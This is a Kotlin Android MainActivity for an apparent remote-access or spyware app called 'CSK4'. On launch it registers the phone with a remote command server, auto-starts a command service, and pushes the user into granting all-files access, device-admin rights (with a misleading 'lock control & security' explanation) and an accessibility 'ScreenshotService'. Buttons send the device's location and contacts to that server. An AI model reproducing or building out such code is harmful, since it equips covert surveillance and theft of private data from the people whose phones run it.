package com.csk4.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)

        findViewById<Button>(R.id.btnWebPanel).setOnClickListener {
            startActivity(Intent(this, WebViewActivity::class.java))
        }

        findViewById<Button>(R.id.btnAdmin).setOnClickListener {
            enableDeviceAdmin()
        }

        findViewById<Button>(R.id.btnAccessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            Toast.makeText(this, "Enable CSK4 accessibility", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.btnStartService).setOnClickListener {
            startService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "✅ Service started", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnStopService).setOnClickListener {
            stopService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "⏹️ Service stopped", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnLocation).setOnClickListener {
            CommandHandler(this, deviceId).handleLocation()
            Toast.makeText(this, "📍 Location sent", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnContacts).setOnClickListener {
            CommandHandler(this, deviceId).handleContacts()
            Toast.makeText(this, "👥 Contacts sent", Toast.LENGTH_SHORT).show()
        }

        registerDevice()
        updateStatus()

        // ⚡ AUTO START: Service + All permissions prompt
        startService(Intent(this, CommandService::class.java))

        // Auto prompt for special permissions on first launch
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            autoPromptSpecialPermissions()
        }, 2000)
    }

    private fun autoPromptSpecialPermissions() {
        // 1. All Files Access (Android 11+)
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "📁 All Files Access ON karein", Toast.LENGTH_LONG).show()
                try {
                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
                return
            }
        }

        // 2. Device Admin
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            enableDeviceAdmin()
            return
        }

        // 3. Accessibility
        if (ScreenshotService.instance == null) {
            Toast.makeText(this, "📸 Accessibility ON karein", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun enableDeviceAdmin() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control & security")
            startActivity(i)
        } else {
            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
        }
    }

    private fun updateStatus() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminActive = dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
        val accActive = ScreenshotService.instance != null
        val storageAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true

        tvStatus.text = """
            🆔 $deviceId
            📱 ${Build.MODEL}
            🤖 Android ${Build.VERSION.RELEASE}
            🔋 Battery: $bat%
            🛡️ Admin: ${if (adminActive) "✅" else "❌"}
            📸 Accessibility: ${if (accActive) "✅" else "❌"}
            📁 Storage Access: ${if (storageAccess) "✅" else "❌"}
            🌐 ${Config.SERVER_URL}
        """.trimIndent()
    }

    private fun registerDevice() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.POST, "${Config.SERVER_URL}/api/device/register",
            JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", "${Build.BRAND} ${Build.MODEL}")
                put("model", Build.MODEL)
                put("android", Build.VERSION.RELEASE)
                put("battery", bat)
                put("token", Config.DEVICE_TOKEN)
            },
            { Toast.makeText(this, "✅ Registered", Toast.LENGTH_SHORT).show() },
            { Toast.makeText(this, "❌ Server fail", Toast.LENGTH_SHORT).show() }
        ))
    }

    override fun onResume() { super.onResume(); updateStatus() }
}
